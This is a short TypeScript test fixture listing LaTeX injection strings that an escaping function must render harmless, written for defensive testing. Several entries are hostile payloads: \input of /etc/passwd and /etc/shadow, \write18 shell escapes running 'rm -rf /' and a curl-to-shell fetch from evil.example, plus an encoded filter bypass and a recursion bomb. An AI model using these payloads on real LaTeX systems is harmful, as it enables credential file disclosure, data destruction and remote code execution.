/**
 * Classic LaTeX injection attempts. Each one must come out of escapeLatex as harmless text
 * that prints exactly as typed (docs/SECURITY.md T8).
 */
export const INJECTION_PAYLOADS = [
  '\\input{/etc/passwd}',
  '\\include{/etc/shadow}',
  '\\write18{rm -rf /}',
  '\\immediate\\write18{curl evil.example | sh}',
  '\\catcode`\\@=11',
  '^^5cinput{/etc/passwd}',
  '$\\alpha$ and $$x$$',
  '\\def\\x{\\x}\\x',
  '\\begin{verbatim}',
  '} \\end{document}',
  '%% comment out the rest',
  'Tab & column # param _ sub ~ tilde',
] as const;
